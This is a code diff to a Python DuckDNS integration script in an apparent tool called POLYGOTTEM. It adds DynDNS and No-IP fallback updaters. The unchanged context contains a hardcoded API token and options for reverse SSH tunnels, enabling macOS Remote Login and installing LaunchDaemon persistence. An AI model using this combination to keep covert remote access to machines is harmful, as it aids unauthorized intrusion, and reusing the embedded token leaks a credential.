@@ -106,14 +106,26 @@ class DuckDNSIntegration:
 
     def __init__(self, domain: str = "polygottem.duckdns.org",
                  api_token: str = "62414348-fa36-4a8c-8fc2-8b96ef48b3ea",
-                 ssh_port: Optional[int] = None):
+                 ssh_port: Optional[int] = None,
+                 dyndns_domain: Optional[str] = None,
+                 dyndns_user: Optional[str] = None,
+                 dyndns_pass: Optional[str] = None,
+                 noip_domain: Optional[str] = None,
+                 noip_user: Optional[str] = None,
+                 noip_pass: Optional[str] = None):
         """
-        Initialize DuckDNS integration
+        Initialize DuckDNS integration with DynDNS and No-IP fallbacks
 
         Args:
             domain: DuckDNS subdomain (e.g., "polygottem.duckdns.org")
             api_token: DuckDNS API token
             ssh_port: SSH server port (None = random non-standard port for security)
+            dyndns_domain: DynDNS domain for fallback (optional)
+            dyndns_user: DynDNS username for fallback (optional)
+            dyndns_pass: DynDNS password for fallback (optional)
+            noip_domain: No-IP domain for fallback (optional)
+            noip_user: No-IP username for fallback (optional)
+            noip_pass: No-IP password for fallback (optional)
         """
         self.domain = domain.replace('.duckdns.org', '')  # Extract subdomain
         self.full_domain = f"{self.domain}.duckdns.org"
@@ -123,6 +135,20 @@ class DuckDNSIntegration:
         self.update_url = f"https://www.duckdns.org/update"
         self.config_file = os.path.expanduser("~/.polygottem_duckdns.conf")
         self.is_macos = is_macos()
+
+        # DynDNS fallback configuration
+        self.dyndns_enabled = dyndns_domain is not None
+        self.dyndns_domain = dyndns_domain
+        self.dyndns_user = dyndns_user
+        self.dyndns_pass = dyndns_pass
+        self.dyndns_update_url = "https://www.dyndns.org/nic/update"
+
+        # No-IP fallback configuration
+        self.noip_enabled = noip_domain is not None
+        self.noip_domain = noip_domain
+        self.noip_user = noip_user
+        self.noip_pass = noip_pass
+        self.noip_update_url = "https://dynupdate.no-ip.com/nic/update"
 
     def enable_macos_remote_login(self) -> bool:
         """
@@ -540,9 +566,242 @@ python3 {os.path.abspath(__file__)} --update
             print(f"Error getting public IP: {e}")
             return None
 
+    def update_dyndns(self, ip: Optional[str] = None, max_retries: int = 3) -> bool:
+        """
+        Update DynDNS with current IP (fallback option)
+
+        Args:
+            ip: IP address to register (auto-detect if None)
+            max_retries: Number of retry attempts for failed updates
+
+        Returns:
+            True if update successful, False otherwise
+        """
+        if not self.dyndns_enabled:
+            return False
+
+        try:
+            # Get IP if not provided
+            if ip is None:
+                ip = self.get_public_ip()
+                if ip is None:
+                    print("✗ Failed to detect public IP for DynDNS update")
+                    return False
+
+            # Validate IP address format
+            if not validate_ip_address(ip):
+                print(f"✗ Invalid IP address format for DynDNS: {ip}")
+                return False
+
+            # Attempt update with retries
+            for attempt in range(1, max_retries + 1):
+                try:
+                    # DynDNS uses HTTP Basic Auth
+                    from requests.auth import HTTPBasicAuth
+
+                    params = {'myip': ip}
+
+                    print(f"[*] Sending update to DynDNS (attempt {attempt}/{max_retries})...")
+                    response = requests.get(
+                        self.dyndns_update_url,
+                        params=params,
+                        auth=HTTPBasicAuth(self.dyndns_user, self.dyndns_pass),
+                        timeout=10
+                    )
+
+                    # Check response
+                    if response.status_code not in [200, 400, 401, 403, 404]:
+                        print(f"✗ HTTP {response.status_code}: {response.text}")
+                        if attempt < max_retries:
+                            print(f"[*] Retrying in 3 seconds...")
+                            time.sleep(3)
+                            continue
+                        return False
+
+                    response_text = response.text.strip()
+
+                    # DynDNS response codes
+                    if response_text.startswith('good') or response_text.startswith('nochg'):
+                        print(f"✓ DynDNS API response: {response_text}")
+                        print(f"✓ DynDNS updated: {self.dyndns_domain} → {ip}")
+                        return True
+
+                    elif response_text.startswith('badauth'):
+                        print(f"✗ DynDNS update failed: Invalid username or password")
+                        return False
+
+                    elif response_text.startswith('badagent'):
+                        print(f"✗ DynDNS update failed: Bad user agent")
+                        return False
+
+                    elif response_text.startswith('notfqdn'):
+                        print(f"✗ DynDNS update failed: Invalid domain '{self.dyndns_domain}'")
+                        return False
+
+                    elif response_text.startswith('nohost'):
+                        print(f"✗ DynDNS update failed: Hostname not found")
+                        return False
+
+                    elif response_text.startswith('numhost'):
+                        print(f"✗ DynDNS update failed: Too many hosts in one request")
+                        return False
+
+                    elif response_text.startswith('abuse'):
+                        print(f"✗ DynDNS update failed: Account marked for abuse")
+                        return False
+
+                    elif response_text.startswith('911'):
+                        print(f"✗ DynDNS update failed: Server error (911)")
+                        if attempt < max_retries:
+                            print(f"[*] Retrying in 5 seconds...")
+                            time.sleep(5)
+                            continue
+                        return False
+
+                    else:
+                        print(f"✗ Unexpected DynDNS response: {response_text}")
+                        if attempt < max_retries:
+                            print(f"[*] Retrying in 2 seconds...")
+                            time.sleep(2)
+                            continue
+                        return False
+
+                except requests.exceptions.RequestException as e:
+                    print(f"✗ Network error updating DynDNS: {e}")
+                    if attempt < max_retries:
+                        print(f"[*] Retrying in 3 seconds...")
+                        time.sleep(3)
+                        continue
+                    return False
+
+            return False
+
+        except Exception as e:
+            print(f"✗ Error updating DynDNS: {e}")
+            return False
+
+    def update_noip(self, ip: Optional[str] = None, max_retries: int = 3) -> bool:
+        """
+        Update No-IP with current IP (third fallback option)
+
+        Args:
+            ip: IP address to register (auto-detect if None)
+            max_retries: Number of retry attempts for failed updates
+
+        Returns:
+            True if update successful, False otherwise
+        """
+        if not self.noip_enabled:
+            return False
+
+        try:
+            # Get IP if not provided
+            if ip is None:
+                ip = self.get_public_ip()
+                if ip is None:
+                    print("✗ Failed to detect public IP for No-IP update")
+                    return False
+
+            # Validate IP address format
+            if not validate_ip_address(ip):
+                print(f"✗ Invalid IP address format for No-IP: {ip}")
+                return False
+
+            # Attempt update with retries
+            for attempt in range(1, max_retries + 1):
+                try:
+                    # No-IP uses HTTP Basic Auth
+                    from requests.auth import HTTPBasicAuth
+
+                    params = {
+                        'hostname': self.noip_domain,
+                        'myip': ip
+                    }
+
+                    print(f"[*] Sending update to No-IP (attempt {attempt}/{max_retries})...")
+                    response = requests.get(
+                        self.noip_update_url,
+                        params=params,
+                        auth=HTTPBasicAuth(self.noip_user, self.noip_pass),
+                        headers={'User-Agent': 'POLYGOTTEM/1.0'},
+                        timeout=10
+                    )
+
+                    # Check response
+                    if response.status_code not in [200, 400, 401, 403, 404]:
+                        print(f"✗ HTTP {response.status_code}: {response.text}")
+                        if attempt < max_retries:
+                            print(f"[*] Retrying in 3 seconds...")
+                            time.sleep(3)
+                            continue
+                        return False
+
+                    response_text = response.text.strip()
+
+                    # No-IP response codes
+                    if response_text.startswith('good') or response_text.startswith('nochg'):
+                        print(f"✓ No-IP API response: {response_text}")
+                        print(f"✓ No-IP updated: {self.noip_domain} → {ip}")
+                        return True
+
+                    elif response_text.startswith('badauth'):
+                        print(f"✗ No-IP update failed: Invalid username or password")
+                        return False
+
+                    elif response_text.startswith('badagent'):
+                        print(f"✗ No-IP update failed: Bad user agent")
+                        return False
+
+                    elif response_text.startswith('notfqdn'):
+                        print(f"✗ No-IP update failed: Invalid domain '{self.noip_domain}'")
+                        return False
+
+                    elif response_text.startswith('nohost'):
+                        print(f"✗ No-IP update failed: Hostname not found")
+                        return False
+
+                    elif response_text.startswith('numhost'):
+                        print(f"✗ No-IP update failed: Too many hosts in one request")
+                        return False
+
+                    elif response_text.startswith('abuse'):
+                        print(f"✗ No-IP update failed: Account marked for abuse")
+                        return False
+
+                    elif response_text.startswith('911'):
+                        print(f"✗ No-IP update failed: Server error (911)")
+                        if attempt < max_retries:
+                            print(f"[*] Retrying in 5 seconds...")
+                            time.sleep(5)
+                            continue
+                        return False
+
+                    else:
+                        print(f"✗ Unexpected No-IP response: {response_text}")
+                        if attempt < max_retries:
+                            print(f"[*] Retrying in 2 seconds...")
+                            time.sleep(2)
+                            continue
+                        return False
+
+                except requests.exceptions.RequestException as e:
+                    print(f"✗ Network error updating No-IP: {e}")
+                    if attempt < max_retries:
+                        print(f"[*] Retrying in 3 seconds...")
+                        time.sleep(3)
+                        continue
+                    return False
+
+            return False
+
+        except Exception as e:
+            print(f"✗ Error updating No-IP: {e}")
+            return False
+
     def update_duckdns(self, ip: Optional[str] = None, verify: bool = True, max_retries: int = 3) -> bool:
         """
         Update DuckDNS with current IP (with validation and verification)
+        Falls back to DynDNS then No-IP if DuckDNS fails
 
         Args:
             ip: IP address to register (auto-detect if None)
@@ -550,7 +809,7 @@ python3 {os.path.abspath(__file__)} --update
             max_retries: Number of retry attempts for failed updates
 
         Returns:
-            True if update successful and verified, False otherwise
+            True if update successful and verified, False only if all options exhausted
         """
         try:
             # Get IP if not provided
@@ -568,7 +827,8 @@ python3 {os.path.abspath(__file__)} --update
 
             print(f"[*] Validated IP: {ip}")
 
-            # Attempt update with retries
+            # Attempt DuckDNS update with retries
+            duckdns_success = False
             for attempt in range(1, max_retries + 1):
                 try:
                     # Update DuckDNS
@@ -588,7 +848,7 @@ python3 {os.path.abspath(__file__)} --update
                             print(f"[*] Retrying in 2 seconds...")
                             time.sleep(2)
                             continue
-                        return False
+                        break
 
                     response_text = response.text.strip()
 
@@ -628,7 +888,7 @@ python3 {os.path.abspath(__file__)} --update
                             print(f"[*] Retrying in 5 seconds...")
                             time.sleep(5)
                             continue
-                        return False
+                        break
 
                     else:
                         print(f"✗ Unexpected response: {response_text}")
@@ -636,7 +896,7 @@ python3 {os.path.abspath(__file__)} --update
                             print(f"[*] Retrying in 2 seconds...")
                             time.sleep(2)
                             continue
-                        return False
+                        break
 
                 except requests.exceptions.RequestException as e:
                     print(f"✗ Network error: {e}")
@@ -644,12 +904,28 @@ python3 {os.path.abspath(__file__)} --update
                         print(f"[*] Retrying in 3 seconds...")
                         time.sleep(3)
                         continue
-                    return False
+                    break
+
+            # If DuckDNS failed, try fallback services in order
+            if self.dyndns_enabled:
+                print("\n[*] DuckDNS update failed, attempting DynDNS fallback...")
+                print("-" * 70)
+                if self.update_dyndns(ip=ip, max_retries=max_retries):
+                    return True
+                print("-" * 70)
+
+            # If DynDNS also failed, try No-IP
+            if self.noip_enabled:
+                print("\n[*] DynDNS update failed, attempting No-IP fallback...")
+                print("-" * 70)
+                if self.update_noip(ip=ip, max_retries=max_retries):
+                    return True
+                print("-" * 70)
 
             return False
 
         except Exception as e:
-            print(f"✗ Error updating DuckDNS: {e}")
+            print(f"✗ Error updating DNS: {e}")
             return False
 
     def setup_ssh_server(self, port: Optional[int] = None) -> bool:
@@ -995,11 +1271,11 @@ python3 {os.path.abspath(__file__)} --update
 
 
 def main():
-    """CLI interface for DuckDNS integration"""
+    """CLI interface for DuckDNS integration with DynDNS fallback"""
     import argparse
 
     parser = argparse.ArgumentParser(
-        description="DuckDNS Integration for POLYGOTTEM",
+        description="DuckDNS Integration for POLYGOTTEM (with DynDNS fallback)",
         formatter_class=argparse.RawDescriptionHelpFormatter,
         epilog="""
 Examples:
@@ -1008,6 +1284,21 @@ Examples:
 
   # Full setup (DuckDNS + SSH)
   python3 duckdns_integration.py --full
+
+  # Update with DynDNS fallback enabled
+  python3 duckdns_integration.py --update \\
+    --dyndns-domain example.dyndns.org \\
+    --dyndns-user username \\
+    --dyndns-pass password
+
+  # Update with multiple fallbacks (DynDNS + No-IP)
+  python3 duckdns_integration.py --update \\
+    --dyndns-domain example.dyndns.org \\
+    --dyndns-user username \\
+    --dyndns-pass password \\
+    --noip-domain example.no-ip.org \\
+    --noip-user username \\
+    --noip-pass password
 
   # macOS: Install persistence (LaunchDaemons + LaunchAgents)
   python3 duckdns_integration.py --install-macos-persistence
@@ -1073,16 +1364,63 @@ Examples:
         metavar='HOST',
         help='Setup reverse SSH tunnel to specified host (shortcut for --tunnel-host)'
     )
+    parser.add_argument(
+        '--dyndns-domain',
+        type=str,
+        help='DynDNS domain for fallback (e.g., example.dyndns.org)'
+    )
+    parser.add_argument(
+        '--dyndns-user',
+        type=str,
+        help='DynDNS username for fallback'
+    )
+    parser.add_argument(
+        '--dyndns-pass',
+        type=str,
+        help='DynDNS password for fallback'
+    )
+    parser.add_argument(
+        '--noip-domain',
+        type=str,
+        help='No-IP domain for fallback (e.g., example.no-ip.org)'
+    )
+    parser.add_argument(
+        '--noip-user',
+        type=str,
+        help='No-IP username for fallback'
+    )
+    parser.add_argument(
+        '--noip-pass',
+        type=str,
+        help='No-IP password for fallback'
+    )
 
     args = parser.parse_args()
 
-    # Initialize integration with port (None = random)
-    duckdns = DuckDNSIntegration(ssh_port=args.port)
+    # Initialize integration with port and DNS fallbacks
+    duckdns = DuckDNSIntegration(
+        ssh_port=args.port,
+        dyndns_domain=args.dyndns_domain,
+        dyndns_user=args.dyndns_user,
+        dyndns_pass=args.dyndns_pass,
+        noip_domain=args.noip_domain,
+        noip_user=args.noip_user,
+        noip_pass=args.noip_pass
+    )
 
     # Show selected port for user awareness
     if args.port is None and (args.full or args.setup_ssh or args.install_macos_persistence):
         print(f"\n🔒 SECURITY: Using randomized SSH port {duckdns.ssh_port}")
         print(f"   (Use --port to specify custom port)\n")
+
+    # Show DNS fallback status
+    if duckdns.dyndns_enabled or duckdns.noip_enabled:
+        print(f"\n[*] DNS Fallback Services Enabled:")
+        if duckdns.dyndns_enabled:
+            print(f"    • DynDNS: {duckdns.dyndns_domain}")
+        if duckdns.noip_enabled:
+            print(f"    • No-IP: {duckdns.noip_domain}")
+        print()
 
     # Handle macOS persistence installation
     if args.install_macos_persistence:
